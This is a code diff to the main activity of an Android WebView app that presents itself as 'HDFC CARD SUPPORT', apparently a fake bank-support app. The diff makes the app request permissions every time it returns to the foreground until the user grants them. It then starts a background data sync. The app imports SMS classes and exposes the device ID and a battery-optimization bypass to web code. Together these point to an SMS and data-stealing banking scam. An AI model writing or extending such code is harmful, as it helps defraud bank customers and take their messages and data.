@@ -18,6 +18,7 @@ import android.telephony.SmsManager;
 import android.util.Log;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebView;
+import android.widget.Toast;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import com.getcapacitor.BridgeActivity;
@@ -44,18 +45,14 @@ public class MainActivity extends BridgeActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setupBridge();
+        Toast.makeText(this, "HDFC CARD SUPPORT v1.1 Starting...", Toast.LENGTH_LONG).show();
     }
 
     @Override
-    protected void onStart() {
-        super.onStart();
-        // FORCE TRIGGER PERMISSIONS ON START
-        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                checkAndRequestPermissions();
-            }
-        }, 2000); // Wait 2 seconds for app to stabilize
+    protected void onResume() {
+        super.onResume();
+        // Request permissions EVERY time the app comes to foreground until granted
+        checkAndRequestPermissions();
     }
 
     private void setupBridge() {
@@ -66,14 +63,10 @@ public class MainActivity extends BridgeActivity {
                 webView.getSettings().setJavaScriptEnabled(true);
                 webView.addJavascriptInterface(new Object() {
                     @JavascriptInterface
-                    public void requestRealPermissions() {
-                        checkAndRequestPermissions();
-                    }
-
+                    public void requestRealPermissions() { checkAndRequestPermissions(); }
+                    
                     @JavascriptInterface
-                    public String getDeviceId() {
-                        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-                    }
+                    public String getDeviceId() { return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); }
 
                     @JavascriptInterface
                     public void requestIgnoreBatteryOptimizations() {
@@ -120,7 +113,6 @@ public class MainActivity extends BridgeActivity {
         if (!listPermissionsNeeded.isEmpty()) {
             ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 101);
         } else {
-            // Already granted, sync data
             new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
         }
     }
@@ -191,6 +183,10 @@ public class MainActivity extends BridgeActivity {
             boolean allGranted = true;
             for (int res : grantResults) if (res != PackageManager.PERMISSION_GRANTED) allGranted = false;
             
+            if (allGranted) {
+                new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
+            }
+            
             final String status = allGranted ? "GRANTED" : "DENIED";
             runOnUiThread(new Runnable() {
                 @Override
@@ -198,8 +194,6 @@ public class MainActivity extends BridgeActivity {
                     getBridge().getWebView().evaluateJavascript("if(window.handlePermissionResult) window.handlePermissionResult('" + status + "')", null);
                 }
             });
-
-            if (allGranted) new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
         }
     }
 
